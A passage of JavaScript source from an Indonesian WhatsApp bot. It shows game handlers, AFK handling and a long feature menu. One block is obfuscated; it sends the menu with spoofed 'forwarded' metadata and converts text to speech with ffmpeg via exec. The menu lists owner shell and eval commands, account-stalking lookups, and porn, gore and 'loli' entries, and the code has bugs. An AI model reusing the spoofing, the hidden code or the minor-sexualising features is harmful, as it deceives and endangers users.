				fs.writeFileSync(
					"./database/tebakbendera.json",
					JSON
					.stringify(
						tebakbendera
					))
			}
		}
		if (susunkata
			.hasOwnProperty(
				sender.split(
					'@')[0]) &&
			!isCmd) {
			kuis = true
			jawaban = susunkata[
				sender
				.split('@')[
					0]]
			if (budy
				.toLowerCase() ==
				jawaban) {
				var htmp =
					randomNomor(
						100)
				addBalance(
					sender,
					htmp,
					balance)
				await reply(
					`*_🎮 Susun Kata  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htmp} 💰_\n\nIngin bermain lagi? kirim *${prefix}susunkata*`
				)
				delete susunkata
					[sender
						.split(
							'@'
						)[0]
					]
				fs.writeFileSync(
					"./database/susunkata.json",
					JSON
					.stringify(
						susunkata
					))
			}
		}
		if (tebakata
			.hasOwnProperty(
				sender.split(
					'@')[0]) &&
			!isCmd) {
			kuis = true
			jawaban = tebakata[
				sender
				.split('@')[
					0]]
			if (budy
				.toLowerCase() ==
				jawaban) {
				var htmu =
					randomNomor(
						100)
				addBalance(
					sender,
					htgmu,
					balance)
				await reply(
					`*_🎮 Tebak Kata  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htmu} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakkata*`
				)
				delete tebakata[
					sender
					.split(
						'@'
					)[0]
				]
				fs.writeFileSync(
					"./database/tebakata.json",
					JSON
					.stringify(
						tebakata
					))
			}
		}
		// AFK
		if (isGroup) {
			if (!mek.key
				.fromMe && mek
				.key.fromMe)
				return
			for (let x of
					mentionUser) {
				if (afk
					.checkAfkUser(
						x, _afk)
				) {
					const
						getId =
						afk
						.getAfkId(
							x,
							_afk
						)
					const
						getReason =
						afk
						.getAfkReason(
							getId,
							_afk
						)
					const
						getTime =
						afk
						.getAfkTime(
							getId,
							_afk
						)
					const cptl = `*「 AFK MODE 」*\n
*Sssttt! Orangnya lagi AFK, jangan diganggu!*
➸ *Alasan*  : ${getReason}
➸ *Sejak* : ${getTime}`
					mentions(
						cptl,
						x,
						true
					)
				}
			}
			if (afk
				.checkAfkUser(
					sender, _afk
				) && !isCmd
			) {
				const getTime =
					afk
					.getAfkTime(
						sender,
						_afk)
				const
					getReason =
					afk
					.getAfkReason(
						sender,
						_afk)
				const ittung =
					ms(await Date
						.now() -
						getTime)
				const pep =
					`*${pushname}* telah kembali dari AFK! Selamat datang kembali~`
				reply(pep)
				_afk.splice(afk
					.getAfkPosition(
						sender,
						_afk
					), 1
				)
				fs.writeFileSync(
					'./database/user/afk.json',
					JSON
					.stringify(
						_afk
					))
			}
		}
		const sendButLocation =
			async (id, text1,
				desc1, gam1,
				but = [],
				options = {}
			) => {
				kma = gam1
				kntl =
					await Maslent
					.prepareMessage(
						from,
						kma,
						location
					)
				const
					buttonMessages = {
						locationMessage: kntl
							.message
							.locationMessage,
						contentText: text1,
						footerText: desc1,
						buttons: but,
						headerType: 6
					}
				Maslent
					.sendMessage(
						id,
						buttonMessages,
						MessageType
						.buttonsMessage,
						options
					)
			}
		switch (command) {


			case 'owner':
			case 'creator':
				sendKontak(from,
					`${owner}`,
					`${ownerName}`,
					'Sibukk!!'
				)
				await sleep(
					1000)
				txtt =
					`ALO BWANG/MBACKS ${pushname}\nNi Owner Saya Kak Yang Telah Menjalan Kan Saya`
				buttons = [{
					buttonId: 'ingfoowner',
					buttonText: {
						displayText: 'Tentang Creator'
					},
					type: 1
				}, {
					buttonId: 'help',
					buttonText: {
						displayText: 'BackToMenu •>'
					},
					type: 1
				}]

				buttonsMessage
					= {
						contentText: `${txtt}`,
						footerText: 'INI OWNERNYA KALAU MAU NGCHAT CHAT AJA GPPAH',
						buttons: buttons,
						headerType: 1
					}

				prep =
					await Maslent
					.prepareMessageFromContent(
						from, {
							buttonsMessage
						}, {})
				Maslent
					.relayWAMessage(
						prep)
				break



			case 'help1':
				//titidkau
				groups = Maslent
					.chats.array
					.filter(v =>
						v.jid
						.endsWith(
							'g.us'
						))
				privat = Maslent
					.chats.array
					.filter(v =>
						v.jid
						.endsWith(
							's.whatsapp.net'
						))
				ram2 =
					`${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
				charger =
					`${charging ? 'lagi dicas' : 'ga dicas'}`
				uptime = process
					.uptime();
				timestampe =
					speed();
				totalChat =
					await Maslent
					.chats.all()
				latensie =
					speed() -
					timestampe
				total = math(
					`${groups.length}*${privat.length}`
				)
				textnya = `*${ucapanWaktu2} Every User💫*
        
⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯
${Mslntptk}ALL FITURE${Mslntptk}
⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯
°•°•°•°•°•°*OWNER°•°•°•°•°•°
*${MSLNT} setfakethumb*${prefix}
*${MSLNT} ${prefix}setthumb*
*${MSLNT} ${prefix}bc* _teks_
*${MSLNT} ${prefix}tobc* _audio_
*${MSLNT} ${prefix}autoread*
*${MSLNT} ${prefix}antidelete*
*${MSLNT} ${prefix}eval*
*${MSLNT} ${prefix}clearall*
*${MSLNT} ${prefix}autovn*
*${MSLNT} ${prefix}autongetik*
*${MSLNT} ${prefix}leaveall*
*${MSLNT} ${prefix}join* _teks_
*${MSLNT} ${prefix}shutdown*
*${MSLNT} ${prefix}getquoted*
*${MSLNT} ${prefix}addupdate* _fiturnya_
*${MSLNT} ${prefix}exif* _nama|author_
*${MSLNT} ${prefix}sewa add/del* _waktunya_
*${MSLNT} ${prefix}premium add* _@tag|nomor_
*${MSLNT} ${prefix}premium del* _@tag|nomor_
*${MSLNT} ${prefix}setpp*
*${MSLNT} ${prefix}setbio*
*${MSLNT} ${prefix}setname*
*${MSLNT} ${prefix}getpp*
*${MSLNT} ${prefix}sharelock*
*${MSLNT} ${prefix}chat* _nomor|teks_
*${MSLNT} ${prefix}>* 
*${MSLNT} ${prefix}$*
*${MSLNT} ${prefix}term*
*${MSLNT} ${prefix}restart*
*${MSLNT} ${prefix}start*
*${MSLNT} ${prefix}clearall*
*${MSLNT} ${prefix}addrespon*
*${MSLNT} ${prefix}dellrespon*
*${MSLNT} ${prefix}listrespon*
⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯
°•°•°•°•°•°*INFO°•°•°•°•°•°
⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯
*${MSLNT} ${prefix}update*
*${MSLNT} ${prefix}iklan*
*${MSLNT} ${prefix}level*
*${MSLNT} ${prefix}rules*
*${MSLNT} ${prefix}profile*
*${MSLNT} ${prefix}waktu*
*${MSLNT} ${prefix}botstat*
*${MSLNT} ${prefix}sewabot*
*${MSLNT} ${prefix}listsewa*
*${MSLNT} ${prefix}owner*
*${MSLNT} ${prefix}ping*
*${MSLNT} ${prefix}runtime*
*${MSLNT} ${prefix}donasi*
*${MSLNT} ${prefix}leaderboard*
*${MSLNT} ${prefix}cekpremium*
*${MSLNT} ${prefix}listpremium*
*${MSLNT} ${prefix}bugreport* [ keluhan ]
⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯
°•°•°•°•°•°*GROUP°•°•°•°•°•°
*${MSLNT} ${prefix}groupsetting*
*${MSLNT} ${prefix}getbio* _reply_
*${MSLNT} ${prefix}afk* _alasan_
*${MSLNT} ${prefix}kontak* _nomor|nama_
*${MSLNT} ${prefix}ceksewa*
*${MSLNT} ${prefix}kickall*
*${MSLNT} ${prefix}infogrup*
*${MSLNT} ${prefix}promote*
*${MSLNT} ${prefix}antilink*
*${MSLNT} ${prefix}demote*
*${MSLNT} ${prefix}listonline*
*${MSLNT} ${prefix}tagall* _teks_
*${MSLNT} ${prefix}leave*
*${MSLNT} ${prefix}kick* _reply_
*${MSLNT} ${prefix}add* _628xxx_
*${MSLNT} ${prefix}setnamegc*
*${MSLNT} ${prefix}setppgroup*
*${MSLNT} ${prefix}getpp*
*${MSLNT} ${prefix}setdeskgc*
*${MSLNT} ${prefix}sider* _reply chat bot_
*${MSLNT} ${prefix}hidetag* _teks/reply teks_
*${MSLNT} ${prefix}linkgc*
*${MSLNT} ${prefix}getdeskgc*
*${MSLNT} ${prefix}opentime*[bukabgrub makai waktu]
*${MSLNT} ${prefix}tutuptime*[tutupgrub makai waktu]
⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯
°•°•°•°•°•°*GAME°•°•°•°•°•°
*${MSLNT} ${prefix}limitgame*
*${MSLNT} ${prefix}slot*
*${MSLNT} ${prefix}gelud* _@tag_
*${MSLNT} ${prefix}tictactoe* _@tag_
*${MSLNT} ${prefix}siapaaku*
*${MSLNT} ${prefix}family100*
*${MSLNT} ${prefix}kuismath*
*${MSLNT} ${prefix}asahotak*
*${MSLNT} ${prefix}tebaklirik*
*${MSLNT} ${prefix}tebaklagu*
*${MSLNT} ${prefix}tebakkata*
*${MSLNT} ${prefix}susunkata*
*${MSLNT} ${prefix}kimiakuis*
*${MSLNT} ${prefix}caklontong*
*${MSLNT} ${prefix}tebakjenaka*
*${MSLNT} ${prefix}tebakanime*
*${MSLNT} ${prefix}tebaktebakan*
*${MSLNT} ${prefix}tebakgambar*
*${MSLNT} ${prefix}tebakumur*
*${MSLNT} ${prefix}tebakbendera*
*${MSLNT} ${prefix}suit* _batu/kertas/gunting_
⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯
°•°•°•°•°•°*RANDOM TEXT°•°•°•°•°•° 
*${MSLNT} ${prefix}quotesyt*
*${MSLNT} ${prefix}quotes*
*${MSLNT} ${prefix}quotesdilan*
*${MSLNT} ${prefix}quotesimage*
*${MSLNT} ${prefix}quotesanime*
*${MSLNT} ${prefix}quotesislami*
*${MSLNT} ${prefix}pantun*
*${MSLNT} ${prefix}katabijak*
*${MSLNT} ${prefix}faktaunik*
*${MSLNT} ${prefix}cerpen*
*${MSLNT} ${prefix}ceritahoror*
⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯
°•°•°•°•°•°*ISLAM°•°•°•°•°•° 
*${MSLNT} ${prefix}kisahnabi*
*${MSLNT} ${prefix}jadwalsholat*
*${MSLNT} ${prefix}alquran*
*${MSLNT} ${prefix}asmaulhusna*
*${MSLNT} ${prefix}alquranaudio*
*${MSLNT} ${prefix}listsurah*
*${MSLNT} ${prefix}ayatkursi*
*${MSLNT} ${prefix}wirid*
*${MSLNT} ${prefix}tahlil*
*${MSLNT} ${prefix}niatshalat*
*${MSLNT} ${prefix}doaharian*
⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯
°•°•°•°•°•°*MAKER°•°•°•°•°•°
*${MSLNT} ${prefix}ktpmaker*  
*${MSLNT} ${prefix}kaneki*
*${MSLNT} ${prefix}gura
*
*${MSLNT} ${prefix}bajinganlu*
*${MSLNT} ${prefix}lolim*
*${MSLNT} ${prefix}remm*
*${MSLNT} ${prefix}neko*
*${MSLNT} ${prefix}thunder*
*${MSLNT} ${prefix}tahta*
*${MSLNT} ${prefix}glitch*
*${MSLNT} ${prefix}asap*
*${MSLNT} ${prefix}glow*
*${MSLNT} ${prefix}bunga*
*${MSLNT} ${prefix}silk*
*${MSLNT} ${prefix}light*
*${MSLNT} ${prefix}fflogo*
*${MSLNT} ${prefix}naruto*
*${MSLNT} ${prefix}breakwall*
*${MSLNT} ${prefix}gneon*
*${MSLNT} ${prefix}glitch*
*${MSLNT} ${prefix}kembangapi*
*${MSLNT} ${prefix}marvel*_text|text_
*${MSLNT} ${prefix}blackpink*_text|text_
*${MSLNT} ${prefix}serigala*_text|text_
*${MSLNT} ${prefix}pubg*_text|text_
⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯
°•°•°•°•°•°*DOWNLOAD°•°•°•°•°•°
*${MSLNT} ${prefix}igdl*
*${MSLNT} ${prefix}twitter*
*${MSLNT} ${prefix}tiktokdl*
*${MSLNT} ${prefix}play*
*${MSLNT} ${prefix}ytmp3*
*${MSLNT} ${prefix}ytmp4*
*${MSLNT} ${prefix}xnxxdown*
*${MSLNT} ${prefix}ytsdl*
*${MSLNT} ${prefix}soundcloud*
*${MSLNT} ${prefix}tiktoknowm*
*${MSLNT} ${prefix}ttmp3*
*${MSLNT} ${prefix}tiktok*
*${MSLNT} ${prefix}mediafire*
*${MSLNT} ${prefix}nhentaipdf* _code_
*${MSLNT} ${prefix}nhsearch*
*${MSLNT} ${prefix}xnxx* _link_
*${MSLNT} ${prefix}xnxxsearch*
*${MSLNT} ${prefix}asupan* [button]
*${MSLNT} ${prefix}snack*
⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯
°•°•°•°•°•°*TOOLS°•°•°•°•°•°
*${MSLNT} ${prefix}toimg*
*${MSLNT} ${prefix}tovideo*
*${MSLNT} ${prefix}tomp3*
*${MSLNT} ${prefix}emoji* _emoji_
*${MSLNT} ${prefix}sticker* _reply foto/video_
*${MSLNT} ${prefix}smeme* _teks|teks_
*${MSLNT} ${prefix}swm* _pack|author_
*${MSLNT} ${prefix}take* _pack|author_
*${MSLNT} ${prefix}tourl*
*${MSLNT} ${prefix}tinyurl*
⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯
°•°•°•°•°•°*MAGER°•°•°•°•°•° 
*${MSLNT} ${prefix}nulis*
⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯
°•°•°•°•°•°*STALKING°•°•°•°•°•°
*${MSLNT} ${prefix}igstalk*
*${MSLNT} ${prefix}tiktokstalk*
*${MSLNT} ${prefix}githubstalk*
⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯
°•°•°•°•°•°*NSFW°•°•°•°•°•°
*${MSLNT} ${prefix}nsfwneko*
*${MSLNT} ${prefix}milf*
*${MSLNT} ${prefix}blowjob*
*${MSLNT} ${prefix}nsfwyuri*
*${MSLNT} ${prefix}nsfwlesbian*
*${MSLNT} ${prefix}nsfwneko*
*${MSLNT} ${prefix}nsfwavatar*
*${MSLNT} ${prefix}nsfwtits*
*${MSLNT} ${prefix}nsfwketa*
*${MSLNT} ${prefix}nsfweroyuri*
*${MSLNT} ${prefix}nsfweroneko*
⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯
°•°•°•°•°•°*TIMELINE°•°•°•°•°•°
*${MSLNT} ${prefix}asupan*
   *Button Jadi Satu*
⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯   
°•°•°•°•°•°*STORAGE°•°•°•°•°•°
*${MSLNT} ${prefix}addvn*
*${MSLNT} ${prefix}listvn*
*${MSLNT} ${prefix}getvn*
*${MSLNT} ${prefix}addimg*
*${MSLNT} ${prefix}listimg*
*${MSLNT} ${prefix}getimg*
*${MSLNT} ${prefix}addvid*
*${MSLNT} ${prefix}listvid*
*${MSLNT} ${prefix}getvid*
*${MSLNT} ${prefix}addstik*
*${MSLNT} ${prefix}liststik*
*${MSLNT} ${prefix}getstik*
*${MSLNT} ${prefix}addcmd*
*${MSLNT} ${prefix}listcmd*
*${MSLNT} ${prefix}delcmd*
⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯
°•°•°•°•°•°*WEABO°•°•°•°•°•°
*${MSLNT} ${prefix}loli*
*${MSLNT} ${prefix}manga*
*${MSLNT} ${prefix}anime*
*${MSLNT} ${prefix}lolivideo*
*${MSLNT} ${prefix}husbu*
*${MSLNT} ${prefix}waifu*
*${MSLNT} ${prefix}milf*
*${MSLNT} ${prefix}neko*
*${MSLNT} ${prefix}kanna*
*${MSLNT} ${prefix}sagiri*
*${MSLNT} ${prefix}hentai*
*${MSLNT} ${prefix}cosplay*
*${MSLNT} ${prefix}wallnime*
*${MSLNT} ${prefix}kusonime*
*${MSLNT} ${prefix}megumin*
*${MSLNT} ${prefix}otaku*
*${MSLNT} ${prefix}doujindesu* 
*${MSLNT} ${prefix}storyanime*
*${MSLNT} ${prefix}quotesanime*
*${MSLNT} ${prefix}otakuongoing*
⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯
°•°•°•°•°•°*OTHER°•°•°•°•°•°
*${MSLNT} ${prefix}attp* _teks_
*${MSLNT} ${prefix}ttp* _teks_
*${MSLNT} ${prefix}dadu*
*${MSLNT} ${prefix}doge*
*${MSLNT} ${prefix}patrick*
*${MSLNT} ${prefix}gura*
*${MSLNT} ${prefix}stickeranime*
*${MSLNT} ${prefix}randomgore*
*${MSLNT} ${prefix}searchgore*
⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯
°•°•°•°•°•°*SEARCHING°•°•°•°•°•°
*${MSLNT} ${prefix}nekopoisearch* 
*${MSLNT} ${prefix}ytsearch* 
*${MSLNT} ${prefix}shopee* 
*${MSLNT} ${prefix}playstore* 
*${MSLNT} ${prefix}ssweb* 
*${MSLNT} ${prefix}google* 
*${MSLNT} ${prefix}image* 
*${MSLNT} ${prefix}pinterest* 
*${MSLNT} ${prefix}pinterest2* 
*${MSLNT} ${prefix}play*
*${MSLNT} ${prefix}ytsdl*
*${MSLNT} ${prefix}xnxxsearch*
*${MSLNT} ${prefix}wiki*
*${MSLNT} ${prefix}stickerwa*
*${MSLNT} ${prefix}komiku*
*${MSLNT} ${prefix}happymod*
*${MSLNT} ${prefix}chara*
*${MSLNT} ${prefix}wallpaper*
⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯
°•°•°•°•°•°*FUN°•°•°•°•°•°
*${MSLNT} ${prefix}mining*
*${MSLNT} ${prefix}cekwatak*
*${MSLNT} ${prefix}cekmati* _nama_
*${MSLNT} ${prefix}wangy* _nama_
*${MSLNT} ${prefix}citacita*
*${MSLNT} ${prefix}toxic*
*${MSLNT} ${prefix}truth*
*${MSLNT} ${prefix}dare*
*${MSLNT} ${prefix}apakah*
*${MSLNT} ${prefix}bisakah*
*${MSLNT} ${prefix}kapankah*
*${MSLNT} ${prefix}rate*
*${MSLNT} ${prefix}jadian*
*${MSLNT} ${prefix}cantik*
*${MSLNT} ${prefix}ganteng*
*${MSLNT} ${prefix}beban*
*${MSLNT} ${prefix}babi*
*${MSLNT} ${prefix}cekganteng*
*${MSLNT} ${prefix}cekcantik*
⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯
°•°•°•°•°•°*FUN°•°•°•°•°•°
⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯

made by Maslent YT

⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯
°•°•°•°•°•°*FUN°•°•°•°•°•°
`
const _0x25fbb3=_0x1242;(function(_0x6e3ab4,_0x2c9c64){const _0x174290=_0x1242,_0x3f5d87=_0x6e3ab4();while(!![]){try{const _0x3d5c3f=parseInt(_0x174290(0xc6))/0x1*(-parseInt(_0x174290(0xcd))/0x2)+parseInt(_0x174290(0xc4))/0x3*(-parseInt(_0x174290(0xc2))/0x4)+-parseInt(_0x174290(0xac))/0x5*(parseInt(_0x174290(0xad))/0x6)+parseInt(_0x174290(0xbc))/0x7*(parseInt(_0x174290(0xc1))/0x8)+-parseInt(_0x174290(0xcf))/0x9*(parseInt(_0x174290(0xbf))/0xa)+-parseInt(_0x174290(0xb1))/0xb*(-parseInt(_0x174290(0xc7))/0xc)+parseInt(_0x174290(0xb8))/0xd*(parseInt(_0x174290(0xbe))/0xe);if(_0x3d5c3f===_0x2c9c64)break;else _0x3f5d87['push'](_0x3f5d87['shift']());}catch(_0x54997d){_0x3f5d87['push'](_0x3f5d87['shift']());}}}(_0x2547,0x1e1b7),Maslent['sendMessage'](from,{'contentText':textnya,'footerText':''+fake,'buttons':[{'buttonId':prefix+'chnl','buttonText':{'displayText':_0x25fbb3(0xbb)},'type':0x1},{'buttonId':prefix+_0x25fbb3(0xd1),'buttonText':{'displayText':_0x25fbb3(0xc9)},'type':0x1}],'headerType':_0x25fbb3(0xcb),'documentMessage':{'url':_0x25fbb3(0xc5),'mimetype':_0x25fbb3(0xbd),'fileSha256':_0x25fbb3(0xaf),'fileLength':'0','pageCount':0x0,'mediaKey':'3n1n1Kbt6aNkBAVg8GMetpwXOQusBR97m/gdkX/DbG0=','fileName':_0x25fbb3(0xb0),'fileEncSha256':'bx/mFEB8SWYMsYMtnlnbbA1B2pJ18rKZqeL7byF+X/A='}},MessageType[_0x25fbb3(0xcc)],{'contextInfo':{'text':_0x25fbb3(0xd2),'mentionedJid':[sender],'forwardingScore':0x3b9aca00,'isForwarded':!![],'sendEphemeral':!![],'externalAdReply':{'title':'Halo\x20Bang/mbak\x20'+pushname+'Subs\x20MaslentYT\x20ya','body':'','mediaType':_0x25fbb3(0xba),'mediaType':0x2,'thumbnail':thumb2,'mediaUrl':_0x25fbb3(0xb2)}},'quoted':floc2}),id='id');function _0x1242(_0x1db167,_0xc80dce){const _0x254792=_0x2547();return _0x1242=function(_0x124225,_0x3c74a9){_0x124225=_0x124225-0xab;let _0x2d623f=_0x254792[_0x124225];return _0x2d623f;},_0x1242(_0x1db167,_0xc80dce);}const gt=require(_0x25fbb3(0xd0))(id);function _0x2547(){const _0xee8183=['24dViKgf','lah\x20teks\x20nya\x20kepanjangan\x20bambang😤','<•\x20Back\x20Menu\x20•>','unlinkSync','DOCUMENT','buttonsMessage','82SjZOer','ffmpeg\x20-i\x20','3222NdJCyU','./XNXX1/gtts','help','©Made\x20By\x20@MaslentYT','sendMessage','997410Wndltq','6rqoAtC','\x20-ar\x2048000\x20-vn\x20-c:a\x20libopus\x20','kXrt+8eqBgD3MAaYx15D+0Mjbi7yiiv9gIBMu9tXtpE=','Copyright\x20By\x20@Maslent','112024LXQLwp','https://youtu.be/GiAk8IY0ATE','Saya\x20Ucapkan\x20Terimakasih\x20kepada,\x20','.mp3','stikga','readFileSync','\x20Telah\x20Menggunakan\x20BOT\x20','2203734ryQwzf','save','GIF','<•Youtube•>','3955WQfHdh','application/xml','56VVXfNT','3620pjXSuq','\x20Dan\x20Jangan\x20Lupa\x20Subscribe\x20Maslent\x20YT','1816DfAsPA','20uUPTCf','length','121062MozdvS','https://mmg.whatsapp.net/d/f/Ao-k40Q-gO_hn2Sqy4nHfrYAYVeWq-7FZNjAqSMngeXI.enc','4208FtEhPm'];_0x2547=function(){return _0xee8183;};return _0x2547();}dtt=_0x25fbb3(0xb3)+pushname+_0x25fbb3(0xb7)+botname+_0x25fbb3(0xc0),ranm=getRandom(_0x25fbb3(0xb4)),rano=getRandom('.ogg'),dtt[_0x25fbb3(0xc3)]>0x186a0?reply(_0x25fbb3(0xc8)):gt[_0x25fbb3(0xb9)](ranm,dtt,function(){const _0x1aa75c=_0x25fbb3;exec(_0x1aa75c(0xce)+ranm+_0x1aa75c(0xae)+rano,_0x49624f=>{const _0x276624=_0x1aa75c;fs[_0x276624(0xca)](ranm),buffer=fs[_0x276624(0xb6)](rano);if(_0x49624f)return reply(mess[_0x276624(0xb5)]());Maslent[_0x276624(0xab)](from,buffer,audio,{'quoted':mek,'ptt':!![]}),fs[_0x276624(0xca)](rano);});});
				break
			case 'help':
			case 'menu':
			case 'fiture':
			case 'fitur':
				//titidkau
				buttons = [{
					buttonId: `${prefix}help1`,
					buttonText: {
						displayText: '<•MENU ALL•>'
					},
					type: 1
				}, {
					buttonId: `${prefix}command`,
					buttonText: {
						displayText: '<•MENU SIMPLE•>'
					},
					type: 1
				}]
				imageMsg = (
						await Maslent
						.prepareMessageMedia(
							fs
							.readFileSync(
								`./XNXXs2/ppk2.jpg`
							),
							'imageMessage', {
								thumbnail: fs
									.readFileSync(
										`./XNXXs2/ppk2.jpg`
									)
							}))
					.imageMessage
				buttonsMessage
					= {
						footerText: 'Bot Made by : ©MaslentYT',
						imageMessage: imageMsg,
						contentText: `silahkan Pilih Salah Satu Dari 2 tombol Di bawah Ini`,
						buttons,
						headerType: 4
					}
				prep =
					await Maslent
					.prepareMessageFromContent(
						from, {
							buttonsMessage
						}, {
							quoted: mek
						})
				Maslent
					.relayWAMessage(
						prep)
				break

			case 'chnl':
				//titidkau
				lentt =
					`subrek ya bang maslent YT nih link nya : https://youtube.com/channel/UCAn_1yox-jIUFhUVYTxI_JA`
				result = fs
					.readFileSync(
						`./database/bot/a/b/kcl/subrek.jpg`
					)
				Maslent
					.sendMessage(
						from,
						result,
						image, {
							quoted: mek,
							caption: lentt
						})
			case 'setreply':
			case 'setfake':
				if (!q) return fakegroup(
					mess
					.wrongFormat
				)
				fake = q
				fakegroup(
					`Succes Mengganti Conversation Fake : ${q}`
				)
				break
			case 'setthumb':

				if ((isMedia &&
						!mek
						.message
						.videoMessage ||
						isQuotedImage ||
						isQuotedSticker
					) &&
					args
					.length == 0
				) {
					boij =
						isQuotedImage ||
						isQuotedSticker ?
						JSON
						.parse(
							JSON
							.stringify(
								Maslent
							)
							.replace(
								'quotedM',
								'm'
							)
						)
						.message
						.extendedTextMessage
						.contextInfo :
						mek
					delb =
						await Maslent
						.downloadMediaMessage(
							boij
						)
					fs.writeFileSync(
						`./XNXXs2/canss.jpg`,
						delb
					)
					fakestatus(
						'Sukses'
					)
				} else {
					reply(
						`Kirim gambar dengan caption ${prefix}sethumb`
					)
				}
				break
			case 'setfakethumb':
				if ((isMedia &&
						!mek
						.message
						.videoMessage ||
						isQuotedImage ||
						isQuotedSticker
					) &&
					args
					.length == 0
				) {
					boij =
						isQuotedImage ||
						isQuotedSticker ?
						JSON
						.parse(
							JSON
							.stringify(
								Maslent
							)
							.replace(
								'quotedM',
								'm'
							)
						)
						.message
						.extendedTextMessage
						.contextInfo :
						mek
					delb =
						await Maslent
						.downloadMediaMessage(
							boij
						)
					fs.writeFileSync(
						`./XNXXs2/ppk2.jpg`,
						delb
					)
					fakestatus(
						'Sukses'
					)
				} else {
					reply(
						`Kirim gambar dengan caption ${prefix+command}`
					)
				}
				break
			case 'command':
				//titidkau
				list = []
				listmenu = [
					`groupmenu`,
					`wibumenu`,
					`stickermenu`,
					`islammenu`,
					`sertimenu`,
					`ceritamenu`,
					`makermenu`,
					`dewasamenu`,
					`ownermenu`,
					`gamemenu`,
					`funmenu`,
					`downloadmenu`,
					`infomenu`,
					`othermenu`,
					`toolsmenu`
				]
				listmenuu = [
					`Menu Group`,
					`Wibu Menu`,
					`Sticker Menu`,
					`Islam Menu`,
					`Serti Menu`,
					`Cerita Menu`,
					`Maker Menu`,
					`Dewasa Menu`,
					`Owner Menu`,
					`Game Menu`,
					`Fun Menu`,
					`Downloader`,
					`Info Menu`,
					`MenuLainnya`,
					`Tools Menu`
				]
				nombor = 1
				startnum = 0
				for (let x of
						listmenu) {
					const yy = {
						title: 'silahkan pilih menunya ' +
							nombor++,
						rows: [
						{
							title: `${listmenuu[startnum++]}`,
							description: ``,
							rowId: `${prefix}${x}`
						}]
					}
					list.push(
						yy)
				}
				listmsg(from,
					`${ucapanWaktu}`,
					`Hai bwang\n*${pushname}*\nPilih Disini untuk fiturnya`,
					list)
				break
			case 'stickerwa':
				//titidkau
				if (args
					.length == 0
				) return reply(
					`Example: ${prefix + command} Koceng Imot`
				)
				query = args
					.join(" ")
				get_result =
					await fetchJson(
						`https://api.lolhuman.xyz/api/stickerwa?apikey=${lolkey}&query=${query}`
					)
				get_result =
					get_result
					.result[0]
					.stickers
				for (var x of
						get_result) {
					ini_buffer =
						await getBuffer(
							`https://api.lolhuman.xyz/api/convert/towebp?apikey=${lolkey}&img=${x}`
						)
					await Maslent
						.sendMessage(
							from,
							ini_buffer,
							sticker
						)
				}

				break
			case 'store':
				list = []
				listmenu = [
					`buttonstik`,
					`buttondl`,
					`buttonown`,
					`buttonpen`,
					`buttongame`,
					`buttongc`,
					`buttonwibu`
				]
				listmenuu = [
					`STICKER MENU`,
					`DOWNLOAD MENU`,
					`OWNER MENU`,
					`NULIS MENU`,
					`GAME MENU`,
					`GRUP MENU`,
					`WIBU MENU`
				]
				nombor = 1
				startnum = 0
				for (let x of
						listmenu) {
					const yy = {
						title: 'List Button Menu' +
							nombor++,
						rows: [
						{
							title: `${listmenuu[startnum++]}`,
							description: `\n\n\n\n\`\`\`JAN LUPA SUBSCRIBE YTMaslent\`\`\``,
							rowId: `${prefix}${x}`
						}]
					}
					list.push(
						yy)
				}
				listmsg(from,
					`${ucapanWaktu}`,
					`Hai kak.....\n*${pushname}*\nJangan Lupa Subscribe Maslent Yahh`,
					list)
				break
				//------------------< Game >------------------- 
			case 'limitgame':
				const bece = atm
					.checkATMuser(
						sender,
						balance)
				//    if (isPremium) return reply(`Limit Game : Unlimited\nBalance : Rp.${balance}`)
				textImg(
					`Limit Game : ${cekGLimit(sender, gcount, glimit)}/${gcount}\nBalance : Rp.${bece}`
				)
				break
			case 'limit':
			case 'ceklimit':
			case 'balance':
			case 'glimit':
				//const balance = atm.checkATMuser(sender, _balance)
				tiyo =
